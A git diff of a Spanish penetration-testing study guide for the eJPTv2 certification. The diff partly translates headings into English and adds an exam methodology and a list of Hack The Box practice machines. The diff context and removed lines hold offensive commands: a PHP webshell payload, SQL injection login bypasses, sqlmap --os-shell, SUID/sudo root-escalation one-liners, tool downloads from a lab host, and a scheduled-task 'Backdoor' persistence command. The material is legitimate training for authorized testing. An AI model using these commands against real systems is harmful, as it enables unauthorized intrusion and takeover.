@@ -1,73 +1,73 @@
-# Guía de Estudio eJPTv2
+# eJPTv2 Study Guide
 
 ## Tabla de Contenidos
 
-- [Introducción](#introducción)
+- [Introduction](#introducción)
 - [Cómo Usar Esta Guía](#cómo-usar-esta-guía)
 - [Parte 1: Fundamentos Teóricos](#parte-1-fundamentos-teóricos)
   - [1.1 Fundamentos de Redes](#11-fundamentos-de-redes)
   - [1.2 Sistemas Operativos Esenciales](#12-sistemas-operativos-esenciales)
-  - [1.3 Resumen y Recursos](#13-resumen-y-recursos)
+  - [1.3 Summary y Resources](#13-resumen-y-recursos)
 - [Parte 2: Reconocimiento y Enumeración](#parte-2-reconocimiento-y-enumeración)
   - [2.1 Reconocimiento Pasivo](#21-reconocimiento-pasivo)
   - [2.2 Reconocimiento Activo](#22-reconocimiento-activo)
   - [2.3 Enumeración de Servicios](#23-enumeración-de-servicios)
-  - [2.4 Resumen y Recursos](#24-resumen-y-recursos)
+  - [2.4 Summary y Resources](#24-resumen-y-recursos)
 - [Parte 3: Técnicas de Explotación](#parte-3-técnicas-de-explotación)
   - [3.1 Vulnerabilidades Comunes](#31-vulnerabilidades-comunes)
   - [3.2 Frameworks de Explotación](#32-frameworks-de-explotación)
   - [3.3 Shells y Acceso Remoto](#33-shells-y-acceso-remoto)
-  - [3.4 Resumen y Recursos](#34-resumen-y-recursos)
+  - [3.4 Summary y Resources](#34-resumen-y-recursos)
 - [Parte 4: Post-Explotación y Escalado de Privilegios](#parte-4-post-explotación-y-escalado-de-privilegios)
   - [4.1 Escalado de Privilegios en Linux](#41-escalado-de-privilegios-en-linux)
   - [4.2 Escalado de Privilegios en Windows](#42-escalado-de-privilegios-en-windows)
   - [4.3 Técnicas de Post-Explotación](#43-técnicas-de-post-explotación)
   - [4.4 Buenas Prácticas](#44-buenas-prácticas)
-  - [4.5 Resumen y Recursos](#45-resumen-y-recursos)
-- [Parte 5: Referencia de Herramientas](#parte-5-referencia-de-herramientas)
-  - [5.1 Herramientas de Escaneo](#51-herramientas-de-escaneo)
-  - [5.2 Herramientas de Fuerza Bruta](#52-herramientas-de-fuerza-bruta)
-  - [5.3 Herramientas de Red](#53-herramientas-de-red)
-  - [5.4 Resumen y Recursos](#54-resumen-y-recursos)
+  - [4.5 Summary y Resources](#45-resumen-y-recursos)
+- [Parte 5: Referencia de Tools](#parte-5-referencia-de-herramientas)
+  - [5.1 Tools de Escaneo](#51-herramientas-de-escaneo)
+  - [5.2 Tools de Fuerza Bruta](#52-herramientas-de-fuerza-bruta)
+  - [5.3 Tools de Red](#53-herramientas-de-red)
+  - [5.4 Summary y Resources](#54-resumen-y-recursos)
 - [Parte 6: Ejercicios Prácticos](#parte-6-ejercicios-prácticos)
   - [6.1 Ejercicio 1: Reconocimiento y Enumeración Básica](#61-ejercicio-1-reconocimiento-y-enumeración-básica)
   - [6.2 Ejercicio 2: Explotación de Aplicaciones Web](#62-ejercicio-2-explotación-de-aplicaciones-web)
   - [6.3 Ejercicio 3: Escalado de Privilegios en Linux](#63-ejercicio-3-escalado-de-privilegios-en-linux)
   - [6.4 Ejercicio 4: Escalado de Privilegios en Windows](#64-ejercicio-4-escalado-de-privilegios-en-windows)
   - [6.5 Ejercicio 5: Prueba de Penetración Multi-Etapa](#65-ejercicio-5-prueba-de-penetración-multi-etapa)
-  - [6.6 Resumen y Recursos](#66-resumen-y-recursos)
+  - [6.6 Summary y Resources](#66-resumen-y-recursos)
 - [Parte 7: Preparación para el Examen](#parte-7-preparación-para-el-examen)
-  - [7.1 Consejos y Trucos](#71-consejos-y-trucos)
+  - [7.1 Tips y Trucos](#71-consejos-y-trucos)
   - [7.2 Errores Comunes](#72-errores-comunes)
   - [7.3 Plan de Estudio](#73-plan-de-estudio)
-  - [7.4 Resumen y Motivación](#74-resumen-y-motivación)
-- [Parte 8: Recursos Adicionales](#parte-8-recursos-adicionales)
-  - [8.1 Referencias y Recursos](#81-referencias-y-recursos)
-  - [8.2 Resumen](#82-resumen)
+  - [7.4 Summary y Motivación](#74-resumen-y-motivación)
+- [Parte 8: Resources Adicionales](#parte-8-recursos-adicionales)
+  - [8.1 Referencias y Resources](#81-referencias-y-recursos)
+  - [8.2 Summary](#82-resumen)
 - [Apéndices](#apéndices)
-  - [A. Cheatsheet de Comandos](#a-cheatsheet-de-comandos)
+  - [A. Cheatsheet de Commands](#a-cheatsheet-de-comandos)
   - [B. Tabla de Referencia de Puertos](#b-tabla-de-referencia-de-puertos)
 
 ---
 
-## Introducción
+## Introduction
 
-¡Bienvenido a mi Guía de Estudio eJPTv2! 👋
+Welcome to my eJPTv2 Study Guide! 👋
 
-Soy **jotatito05** y estos son los apuntes que he creado durante mi preparación para el examen eLearnSecurity Junior Penetration Tester versión 2 (eJPTv2). He decidido compartirlos **voluntaria y gratuitamente** con la comunidad porque creo firmemente que el conocimiento en ciberseguridad debe ser accesible para todos.
+I am **jotatito05** and these are the notes I created during my preparation for the exam eLearnSecurity Junior Penetration Tester versión 2 (eJPTv2). I decided to share them **voluntarily and for free** with the community because I firmly believe knowledge in cybersecurity should be accessible to everyone.
 
 Estos apuntes son el resultado de horas de estudio, práctica y recopilación de información de múltiples fuentes. Los comparto con la esperanza de que te ayuden en tu propio camino hacia la certificación eJPTv2, tal como otros recursos me ayudaron a mí.
 
-### ¿Qué encontrarás en esta guía?
+### What will you find in this guide?
 
-- **Fundamentos teóricos sólidos**: Conceptos de redes, protocolos y sistemas operativos
-- **Técnicas prácticas**: Reconocimiento, enumeración, explotación y post-explotación
-- **Herramientas esenciales**: Guías detalladas de las herramientas más importantes
-- **Ejercicios completos**: Escenarios paso a paso para practicar
-- **Consejos para el examen**: Estrategias, trucos y errores comunes a evitar
-- **Recursos adicionales**: Enlaces a documentación, plataformas de práctica y comunidades
+- **Solid theoretical fundamentals**: Conceptos de redes, protocolos y sistemas operativos
+- **Practical techniques**: Reconocimiento, enumeración, explotación y post-explotación
+- **Essential tools**: Guías detalladas de las herramientas más importantes
+- **Complete exercises**: Escenarios paso a paso para practicar
+- **Exam tips**: Estrategias, trucos y errores comunes a evitar
+- **Additional resources**: Enlaces a documentación, plataformas de práctica y comunidades
 
-### ¿Por qué comparto estos apuntes?
+### Why share these notes?
 
 Cuando empecé a estudiar para el eJPTv2, encontré mucha información dispersa y a veces confusa. Decidí crear mis propios apuntes organizados y, una vez que vi lo útiles que eran para mí, pensé: "¿Por qué no compartirlos con otros que están en el mismo camino?"
 
@@ -77,11 +77,11 @@ Cuando empecé a estudiar para el eJPTv2, encontré mucha información dispersa 
 - **Honesto**: Estos son mis apuntes personales, con mi estilo y mi forma de entender las cosas
 - **Colaborativo**: Si encuentras errores o quieres contribuir, ¡eres bienvenido!
 
-> **📝 Nota personal**: Estos apuntes reflejan mi proceso de aprendizaje. Puede que encuentres formas diferentes de hacer las cosas, y eso está bien. Usa lo que te sirva y adapta el resto a tu estilo.
+> **📝 Note personal**: Estos apuntes reflejan mi proceso de aprendizaje. Puede que encuentres formas diferentes de hacer las cosas, y eso está bien. Usa lo que te sirva y adapta el resto a tu estilo.
 
-## Cómo Usar Esta Guía
+## How to Use This Guide
 
-### Para principiantes
+### For Beginners
 
 Si eres nuevo en pentesting, te recomendamos seguir la guía en orden:
 
@@ -91,7 +91,7 @@ Si eres nuevo en pentesting, te recomendamos seguir la guía en orden:
 4. **Practica con ejercicios** (Parte 6): Aplica todo lo aprendido en escenarios completos
 5. **Prepárate para el examen** (Parte 7): Revisa consejos y estrategias específicas
 
-### Para usuarios con experiencia
+### For Experienced Users
 
 Si ya tienes conocimientos básicos:
 
@@ -100,7 +100,7 @@ Si ya tienes conocimientos básicos:
 - Revisa la **referencia de herramientas** (Parte 5) como cheatsheet rápido
 - Consulta los **consejos para el examen** (Parte 7) para estrategias específicas del eJPTv2
 
-### Consejos de estudio
+### Tips de estudio
 
 - **Practica activamente**: No solo leas, ejecuta los comandos en un entorno de laboratorio
 - **Toma notas**: Crea tu propio cheatsheet personalizado
@@ -108,7 +108,7 @@ Si ya tienes conocimientos básicos:
 - **Únete a comunidades**: Comparte dudas y aprende de otros
 - **Sé paciente contigo mismo**: Todos aprendemos a nuestro propio ritmo
 
-### Convenciones de formato
+### Formatting Conventions
 
 A lo largo de esta guía usaremos:
 
@@ -135,24 +135,24 @@ Nmap scan report for 192.168.1.1
 - Segundo paso
 - Tercer paso
 
-> **Nota importante**: Los cuadros como este resaltan información clave
+> **Note importante**: Los cuadros como este resaltan información clave
 
-> **⚠️ Advertencia**: Estos cuadros señalan precauciones importantes
+> **⚠️ Warning**: Estos cuadros señalan precauciones importantes
 
-> **💡 Consejo**: Estos cuadros ofrecen trucos y mejores prácticas
+> **💡 Tip**: Estos cuadros ofrecen trucos y mejores prácticas
 
-### Entorno de práctica
+### Practice Environment
 
 Para seguir esta guía necesitarás:
 
 - **Sistema operativo**: Linux (preferiblemente Kali Linux o Parrot OS)
 - **Máquinas virtuales**: VirtualBox o VMware para crear laboratorios
 - **Plataformas online**: Cuentas en HackTheBox, TryHackMe o similares
-- **Herramientas**: La mayoría vienen preinstaladas en Kali Linux
+- **Tools**: La mayoría vienen preinstaladas en Kali Linux
 
-> **💡 Consejo**: Si no puedes instalar Linux, puedes usar Windows con WSL2 (Windows Subsystem for Linux) o una máquina virtual.
+> **💡 Tip**: Si no puedes instalar Linux, puedes usar Windows con WSL2 (Windows Subsystem for Linux) o una máquina virtual.
 
-### Ética y legalidad
+### Ethics and Legality
 
 > **⚠️ IMPORTANTE**: Las técnicas descritas en estos apuntes son para fines educativos y deben usarse ÚNICAMENTE en:
 > - Tus propios sistemas
@@ -162,7 +162,7 @@ Para seguir esta guía necesitarás:
 >
 > El uso no autorizado de estas técnicas es **ilegal** y puede tener consecuencias graves. Comparto este conocimiento con la confianza de que lo usarás de forma ética y responsable.
 
-### Agradecimientos y contribuciones
+### Acknowledgments & Contributions
 
 Estos apuntes son posibles gracias a la comunidad de ciberseguridad que comparte conocimiento libremente. Si encuentras útil este material:
 
@@ -175,13 +175,97 @@ Estos apuntes son posibles gracias a la comunidad de ciberseguridad que comparte
 
 ---
 
-¡Estás listo para comenzar tu viaje hacia la certificación eJPTv2! Recuerda: cada experto fue una vez un principiante. Con dedicación y práctica, tú también puedes lograrlo.
+You are ready to start your journey hacia la certificación eJPTv2! Remember: every expert was once a beginner. Con dedicación y práctica, tú también puedes lograrlo.
 
 **- jotatito05** 🚀
 
 ---
 
-## Parte 1: Fundamentos Teóricos
+## 🚀 Metodología de Examen: "Zero to Hero" (Tu Playbook)
+
+> **💡 IMPORTANTE**: Si te pierdes durante el examen, **VUELVE AQUÍ**. Este es tu mapa paso a paso para comprometer cualquier máquina.
+
+### 1. La Fase de "Hola, ¿quién está ahí?" (Discovery)
+No puedes atacar lo que no ves. Lo primero es encontrar tu objetivo.
+
+1.  **¿Cuál es mi IP?**
+    ```bash
+    ip addr  # Mira tu interfaz (ej. tun0 o eth1)
+    ```
+2.  **¿Quiénes son mis vecinos? (Ping Sweep)**
+    ```bash
+    # Si tu IP es 192.168.1.100/24
+    fping -a -g 192.168.1.0/24 2>/dev/null
+    # O con Nmap (más lento pero seguro)
+    nmap -sn 192.168.1.0/24
+    ```
+3.  **ANOTA LAS IPs**: Crea un archivo `targets.txt` o anótalas en tu bloc de notas.
+
+### 2. La Fase de "Radiografía" (Enumeración)
+El 90% del éxito está aquí. No corras a buscar exploits todavía.
+
+1.  **Escaneo Rápido (Para ver puertos abiertos)**
+    ```bash
+    nmap -p- --min-rate 5000 -T4 <IP> -oN quick_scan.txt
+    ```
+2.  **Escaneo Detallado (Para saber QUÉ corre en esos puertos)**
+    ```bash
+    # Supongamos que encontraste los puertos 22, 80, 445
+    nmap -p 22,80,445 -sC -sV -O <IP> -oN detailed_scan.txt
+    ```
+3.  **Investigación por Servicio (El Checklist)**:
+    *   **HTTP (80/443/8080)**:
+        *   ¿Hay página web? Ábrela en el navegador.
+        *   ¿Código fuente? `Ctrl+U`. Busca comentarios, versiones, usuarios.
+        *   ¿Directorios ocultos? `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`.
+        *   ¿Tecnologías? `whatweb <IP>`.
+    *   **SMB (139/445)**:
+        *   ¿Puedo entrar sin contraseña? `smbclient -L //<IP> -N`.
+        *   ¿Qué versión es? (Nmap ya te lo dijo).
+    *   **FTP (21)**:
+        *   ¿Login anónimo? `ftp <IP>` -> user: `anonymous`, pass: `anonymous`.
+    *   **SSH (22)**:
+        *   Rara vez se explota directamente. Busca credenciales en otros lados (web, SMB).
+
+### 3. La Fase de "Entrar a la Fuerza" (Explotación)
+Ahora que sabes qué hay, busca cómo romperlo.
+
+1.  **¿Tiene versión conocida?** (Ej. "Apache 2.4.49" o "vsftpd 2.3.4")
+    *   Busca en Google: `Apache 2.4.49 exploit`.
+    *   Busca en local: `searchsploit Apache 2.4.49`.
+2.  **¿Hay credenciales por defecto?**
+    *   Prueba: `admin:admin`, `root:root`, `guest:guest`.
+    *   Busca en Google: `Tomcat default credentials`.
+3.  **¿Fuerza bruta?** (Último recurso)
+    *   `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP>`
+
+### 4. La Fase de "Soy Dios" (Post-Explotación)
+Ya estás dentro (tienes una shell). ¿Y ahora qué?
+
+1.  **Mejora tu Shell (Si estás en Linux)**:
+    ```bash
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    # O
+    script /dev/null -c bash
+    ```
+2.  **¿Quién soy?**
+    *   `whoami` -> ¿Eres root? ¡Ganaste!
+    *   `id` -> ¿A qué grupos pertenezco?
+3.  **¿Cómo me hago root? (Escalada de Privilegios)**
+    *   **Sudo**: `sudo -l` (¿Puedo ejecutar algo como root sin contraseña?).
+    *   **SUID**: `find / -perm -4000 2>/dev/null` (¿Hay binarios raros con permisos especiales?).
+    *   **Kernel**: ¿Es un Linux muy viejo? Busca "Dirty Cow" o similares.
+    *   **Archivos**: Busca contraseñas en `/var/www/html/config.php` o historiales `.bash_history`.
+
+### 5. La Fase de "El Siguiente Salto" (Pivoting - Avanzado)
+Si la máquina tiene otra interfaz de red (ej. 10.10.10.x), hay más máquinas detrás.
+
+1.  **Descubrir**: `ip addr` o `ifconfig`.
+2.  **Enrutar**: Usar `autoroute` en Metasploit o `chisel` para tunelizar tráfico.
+
+---
+
+## Part 1: Theoretical Fundamentals
 
 Antes de lanzarte a hackear sistemas, necesitas entender cómo funcionan las redes y los sistemas operativos. Esta sección te dará las bases sólidas que necesitas para el resto de tu viaje en pentesting.
 
@@ -193,7 +277,7 @@ Antes de lanzarte a hackear sistemas, necesitas entender cómo funcionan las red
 
 El modelo OSI tiene 7 capas:
 
-| Capa | Nombre | Función | Ejemplos | Relevancia para Pentesting |
+| Capa | Nombre | Función | Examples | Relevancia para Pentesting |
 |------|--------|---------|----------|---------------------------|
 | 7 | Aplicación | Interacción con aplicaciones de usuario | HTTP, FTP, SSH, DNS | Vulnerabilidades de aplicaciones web, ataques a protocolos |
 | 6 | Presentación | Formato y cifrado de datos | SSL/TLS, JPEG, ASCII | Ataques de criptografía, manipulación de datos |
@@ -212,11 +296,15 @@ El modelo OSI tiene 7 capas:
 | Internet | Capa 3 | Enrutamiento de paquetes | IP, ICMP, ARP |
 | Acceso a Red | Capas 1-2 | Acceso al medio físico | Ethernet, Wi-Fi |
 
-**Analogía práctica**: Imagina que envías una carta:
-- **Aplicación**: Escribes el mensaje
-- **Transporte**: Decides si enviarla certificada (TCP) o normal (UDP)
-- **Internet**: La oficina postal determina la ruta
-- **Acceso a Red**: El cartero la entrega físicamente
+**Analogía práctica (El Servicio Postal)**:
+Imagina que envías una carta importante:
+- **Aplicación (Capa 7)**: Escribes el contenido de la carta (HTTP, el mensaje).
+- **Transporte (Capa 4)**: Decides si quieres acuse de recibo (TCP) o si la envías rápido y sin garantía (UDP).
+- **Red (Capa 3)**: La oficina de correos decide la mejor ruta para llegar al destino (IP).
+- **Enlace de Datos (Capa 2)**: El camión de correos lleva la carta a la siguiente ciudad (MAC Address).
+- **Física (Capa 1)**: La carretera por donde va el camión (Cables).
+
+> **💡 Para el examen**: Solo necesitas preocuparte realmente por las capas 3 (IP), 4 (TCP/UDP) y 7 (Aplicación). El resto es "magia" que ocurre por debajo.
 
 [⬆️ Volver al inicio](#tabla-de-contenidos)
 
@@ -263,7 +351,7 @@ El modelo OSI tiene 7 capas:
 /30 = 255.255.255.252 = 2 hosts
 ```
 
-**Comandos útiles**:
+**Commands útiles**:
 ```bash
 # Calcular subred
 ipcalc 192.168.1.0/24
@@ -298,7 +386,7 @@ chmod u+s binario       # SUID (ejecuta como propietario)
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-**Comandos esenciales**:
+**Commands esenciales**:
 ```bash
 # Navegación
 pwd; cd /ruta; ls -la
@@ -336,7 +424,7 @@ ip addr; ip route; netstat -tulpn; ss -tulpn
 
 #### Windows - Lo que DEBES saber
 
-**Comandos CMD esenciales**:
+**Commands CMD esenciales**:
 ```cmd
 # Sistema
 systeminfo
@@ -386,7 +474,7 @@ C:\Users\*\NTUSER.DAT              # Registro del usuario
 C:\Windows\Panther\Unattend.xml    # Puede contener credenciales
 ```
 
-### 1.3 Resumen y Recursos
+### 1.3 Summary y Resources
 
 **Puntos clave**:
 - Modelo OSI/TCP-IP: Entiende las 7 capas y dónde ocurren los ataques
@@ -395,7 +483,7 @@ C:\Windows\Panther\Unattend.xml    # Puede contener credenciales
 - Linux: Permisos, SUID, comandos básicos
 - Windows: CMD, PowerShell, servicios, registro
 
-**Recursos**:
+**Resources**:
 - [Linux Journey](https://linuxjourney.com/)
 - [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/)
 - [HackTricks](https://book.hacktricks.xyz/)
@@ -406,11 +494,11 @@ C:\Windows\Panther\Unattend.xml    # Puede contener credenciales
 
 ---
 
-## Parte 2: Reconocimiento y Enumeración
+## Part 2: Reconnaissance & Enumeration
 
 ### 2.1 Reconocimiento Pasivo
 
-**OSINT - Herramientas clave**:
+**OSINT - Tools clave**:
 
 ```bash
 # Google Dorks
@@ -431,7 +519,7 @@ curl -s "https://crt.sh/?q=%25.ejemplo.com&output=json" | jq -r '.[].name_value'
 shodan search hostname:ejemplo.com
 ```
 
-**Recursos OSINT**:
+**Resources OSINT**:
 - [OSINT Framework](https://osintframework.com/)
 - [Shodan](https://www.shodan.io/)
 - [crt.sh](https://crt.sh/)
@@ -439,7 +527,7 @@ shodan search hostname:ejemplo.com
 
 ### 2.2 Reconocimiento Activo - Nmap Mastery
 
-**Comandos esenciales de Nmap**:
+**Commands esenciales de Nmap**:
 
 ```bash
 # Escaneo básico rápido
@@ -628,7 +716,7 @@ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-communit
 | 3306 | MySQL | mysql, nmap | `mysql -h IP -u root -p` |
 | 3389 | RDP | xfreerdp, hydra | `xfreerdp /v:IP /u:user /p:pass` |
 
-### 2.4 Resumen y Recursos
+### 2.4 Summary y Resources
 
 **Mi checklist de enumeración**:
 1. ✅ Nmap full port scan
@@ -637,7 +725,7 @@ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-communit
 4. ✅ Buscar vulnerabilidades conocidas
 5. ✅ Documentar TODO
 
-**Recursos**:
+**Resources**:
 - [HackTricks](https://book.hacktricks.xyz/) - Técnicas por servicio
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 - [SecLists](https://github.com/danielmiessler/SecLists) - Wordlists
@@ -648,7 +736,7 @@ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-communit
 
 ---
 
-## Parte 3: Técnicas de Explotación
+## Part 3: Exploitation Techniques
 
 ### 3.1 Vulnerabilidades Comunes
 
@@ -795,7 +883,7 @@ GIF89a<?php system($_GET['cmd']); ?>
 
 ### 3.2 Frameworks de Explotación - Metasploit
 
-**Comandos esenciales de Metasploit**:
+**Commands esenciales de Metasploit**:
 
 ```bash
 # Iniciar
@@ -949,7 +1037,7 @@ http://ejemplo.com/shell.php?cmd=whoami
 http://ejemplo.com/shell.php?cmd=ls -la
 ```
 
-### 3.4 Resumen y Recursos
+### 3.4 Summary y Resources
 
 **Vulnerabilidades clave para eJPTv2**:
 - ✅ SQL Injection (sqlmap)
@@ -958,14 +1046,14 @@ http://ejemplo.com/shell.php?cmd=ls -la
 - ✅ File Upload
 - ✅ XSS (básico)
 
-**Herramientas esenciales**:
+**Essential tools**:
 - ✅ Metasploit Framework
 - ✅ msfvenom (payloads)
 - ✅ sqlmap
 - ✅ Netcat
 - ✅ Burp Suite
 
-**Recursos**:
+**Resources**:
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 - [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [GTFOBins](https://gtfobins.github.io/)
@@ -976,12 +1064,9 @@ http://ejemplo.com/shell.php?cmd=ls -la
 
 ---
 
-## Parte 4: Post-Explotación y Escalado de Privilegios
+## Part 4: Post-Exploitation & Privilege Escalation
 
 ### 4.1 Escalado de Privilegios en Linux
-
-> **💡 Mentalidad del Hacker**: Escalado de Privilegios es "Juego de Tronos". Empiezas como campesino (`www-data`) y quieres ser Rey (`root`).
-> Todo se reduce a encontrar **un error de configuración**: un archivo que puedes escribir, un password olvidado o un programa viejo (Kernel exploit).
 
 #### Enumeración Inicial
 
@@ -1048,7 +1133,7 @@ find / -perm -222 -type f 2>/dev/null
 
 **Explotar SUID** (consulta [GTFOBins](https://gtfobins.github.io/)):
 ```bash
-# Ejemplos comunes
+# Examples comunes
 /usr/bin/find . -exec /bin/sh -p \; -quit
 /usr/bin/vim -c ':!/bin/sh'
 /usr/bin/nmap --interactive
@@ -1063,7 +1148,7 @@ bash -p
 # Ver permisos sudo
 sudo -l
 
-# Ejemplos de explotación
+# Examples de explotación
 sudo /usr/bin/find . -exec /bin/sh \; -quit
 sudo /usr/bin/vim -c ':!/bin/sh'
 sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'
@@ -1090,7 +1175,7 @@ find /etc/cron* -type f -perm -o+w
 # Listar capabilities
 getcap -r / 2>/dev/null
 
-# Ejemplo: python con cap_setuid
+# Example: python con cap_setuid
 /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
@@ -1123,7 +1208,7 @@ find / -name id_rsa 2>/dev/null
 find / -name authorized_keys 2>/dev/null
 ```
 
-#### Herramientas de Enumeración Automatizada
+#### Tools de Enumeración Automatizada
 
 **LinPEAS** (mi favorita):
 ```bash
@@ -1276,7 +1361,7 @@ list_tokens -u
 impersonate_token "NT AUTHORITY\SYSTEM"
 ```
 
-#### Herramientas de Enumeración Automatizada
+#### Tools de Enumeración Automatizada
 
 **WinPEAS** (mi favorita):
 ```cmd
@@ -1381,7 +1466,7 @@ schtasks /create /tn "Backdoor" /tr "C:\temp\shell.exe" /sc onlogon /ru System
 4. Escalar privilegios
 5. Documentar todo
 
-### 4.5 Resumen y Recursos
+### 4.5 Summary y Resources
 
 **Linux PrivEsc - Checklist**:
 - ✅ SUID binaries
@@ -1399,7 +1484,7 @@ schtasks /create /tn "Backdoor" /tr "C:\temp\shell.exe" /sc onlogon /ru System
 - ✅ Registry exploits
 - ✅ Token impersonation
 
-**Recursos**:
+**Resources**:
 - [GTFOBins](https://gtfobins.github.io/) - Linux binaries
 - [LOLBAS](https://lolbas-project.github.io/) - Windows binaries
 - [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
@@ -1412,9 +1497,9 @@ schtasks /create /tn "Backdoor" /tr "C:\temp\shell.exe" /sc onlogon /ru System
 
 ---
 
-## Parte 5: Referencia de Herramientas
+## Part 5: Tools Reference
 
-### 5.1 Herramientas de Escaneo
+### 5.1 Tools de Escaneo
 
 **Nmap** - Ya cubierto en Parte 2
 
@@ -1429,7 +1514,7 @@ sudo masscan -p80,443,8080 192.168.1.0/24 --rate=10000
 rustscan -a 192.168.1.100 -- -sV -sC
 ```
 
-### 5.2 Herramientas de Fuerza Bruta
+### 5.2 Tools de Fuerza Bruta
 
 **Hydra** - Brute force multi-protocolo:
 ```bash
@@ -1474,7 +1559,7 @@ hashcat -m 1000 -a 0 hashes.txt rockyou.txt
 hashcat --help | grep -i "hash"
 ```
 
-### 5.3 Herramientas de Red
+### 5.3 Tools de Red
 
 **Netcat** - La navaja suiza:
 ```bash
@@ -1516,9 +1601,9 @@ tcpdump -i eth0 port 80
 tcpdump -r captura.pcap
 ```
 
-### 5.4 Resumen y Recursos
+### 5.4 Summary y Resources
 
-**Herramientas esenciales para eJPTv2**:
+**Essential tools para eJPTv2**:
 - ✅ Nmap (escaneo)
 - ✅ Gobuster (web enum)
 - ✅ Hydra (brute force)
@@ -1532,155 +1617,82 @@ tcpdump -r captura.pcap
 
 ---
 
-## Parte 6: Ejercicios Prácticos
+## Part 6: Hack The Box Machines (Lab)
 
-### 6.1 Ejercicio 1: Reconocimiento y Enumeración Básica
+Para aprobar el eJPTv2, la práctica es fundamental. En lugar de ejercicios genéricos, te recomiendo encarecidamente completar estas máquinas de **Hack The Box**. Cubren exactamente las técnicas que necesitas dominar.
 
-**Escenario**: Tienes una IP objetivo (192.168.1.100). Realiza reconocimiento completo.
+### 6.1 Starting Point (Fundamentos)
+Estas máquinas son gratuitas y te enseñan lo básico de cada servicio.
 
-**Pasos**:
-1. Ping sweep para verificar que está activo
-2. Nmap full port scan
-3. Enumerar servicios encontrados
-4. Documentar hallazgos
+| Máquina | SO | Dificultad | Conceptos Clave |
+|---------|----|------------|-----------------|
+| **Meow** | Linux | Muy Fácil | Telnet, conexión básica |
+| **Fawn** | Linux | Muy Fácil | FTP, transferencia de archivos |
+| **Dancing** | Windows | Muy Fácil | SMB, recursos compartidos |
+| **Redeemer** | Linux | Muy Fácil | Redis, bases de datos NoSQL |
+| **Archetype** | Windows | Fácil | SQL Server, SMB, Impacket |
 
-**Solución**:
-```bash
-# 1. Verificar host activo
-ping -c 1 192.168.1.100
+### 6.2 Máquinas Linux (Easy)
+Ideales para practicar enumeración web y escalada de privilegios en Linux.
 
-# 2. Escaneo completo
-nmap -sS -sV -p- 192.168.1.100 -oA escaneo_completo
+| Máquina | Dificultad | Conceptos Clave |
+|---------|------------|-----------------|
+| **Lame** | Fácil | Samba, Distcc (Similar a Metasploitable) |
+| **Shocker** | Fácil | Shellshock (CGI), escalada por sudo |
+| **Bashed** | Fácil | Web Shells, escalada por scripts python |
+| **Nibbles** | Fácil | CMS vulnerables, escalada por script monitor.sh |
+| **Cap** | Fácil | IDOR, Linux Capabilities (cap_setuid) |
 
-# 3. Enumerar servicios específicos
-# Si hay SMB (445)
-enum4linux -a 192.168.1.100
+### 6.3 Máquinas Windows (Easy)
+Esenciales para entender el entorno Windows y Active Directory básico.
 
-# Si hay HTTP (80)
-gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
+| Máquina | Dificultad | Conceptos Clave |
+|---------|------------|-----------------|
+| **Blue** | Fácil | EternalBlue (MS17-010) - ¡Clásico! |
+| **Devel** | Fácil | FTP anónimo, ASP webshells, Kernel exploit |
+| **Jerry** | Fácil | Tomcat, credenciales por defecto |
+| **Granny** | Fácil | IIS, WebDAV, exploits antiguos |
+| **Optimum** | Fácil | HFS (HttpFileServer), escalada Windows |
 
-# Si hay FTP (21)
-nmap --script=ftp-anon -p 21 192.168.1.100
+> **💡 Tip:** No uses Metasploit para todas. Intenta explotarlas manualmente primero para entender qué está pasando. El examen eJPTv2 permite Metasploit, pero saber hacerlo a mano te salvará si falla.
 
-# 4. Documentar en notas.txt
-```
-
-### 6.2 Ejercicio 2: Explotación de Aplicaciones Web
-
-**Escenario**: Aplicación web con formulario de login vulnerable a SQLi.
-
-**Pasos**:
-1. Identificar SQLi
-2. Bypass de autenticación
-3. Extraer datos de la base de datos
-4. Obtener shell
-
-**Solución**:
-```bash
-# 1. Probar SQLi básico
-' OR 1=1--
-admin' OR '1'='1'--
-
-# 2. sqlmap
-sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test" --dbs
-
-# 3. Dump datos
-sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test" -D database -T users --dump
-
-# 4. Intentar escribir shell
-sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test" --os-shell
-```
-
-### 6.3 Ejercicio 3: Escalado de Privilegios en Linux
-
-**Escenario**: Tienes shell como usuario www-data. Necesitas root.
-
-**Pasos**:
-1. Enumeración inicial
-2. Buscar vectores de escalado
-3. Explotar
-4. Obtener root
-
-**Solución**:
-```bash
-# 1. Enumeración
-whoami
-id
-sudo -l
-uname -a
-
-# 2. Buscar SUID
-find / -perm -4000 -type f 2>/dev/null
-
-# 3. Transferir LinPEAS
-wget http://10.10.10.10/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-
-# 4. Explotar (ejemplo: sudo vim)
-sudo /usr/bin/vim -c ':!/bin/bash'
-```
-
-### 6.4 Ejercicio 4: Escalado de Privilegios en Windows
-
-**Escenario**: Tienes shell como usuario normal. Necesitas SYSTEM.
-
-**Pasos**:
-1. Enumeración inicial
-2. Buscar vectores de escalado
-3. Explotar
-4. Obtener SYSTEM
-
-**Solución**:
-```cmd
-# 1. Enumeración
-whoami /priv
-systeminfo
-
-# 2. Transferir WinPEAS
-certutil -urlcache -f http://10.10.10.10/winpeas.exe winpeas.exe
-winpeas.exe
-
-# 3. Buscar servicios vulnerables
-wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\"
-
-# 4. Explotar (ejemplo: unquoted service path)
-sc config servicio binPath= "C:\temp\shell.exe"
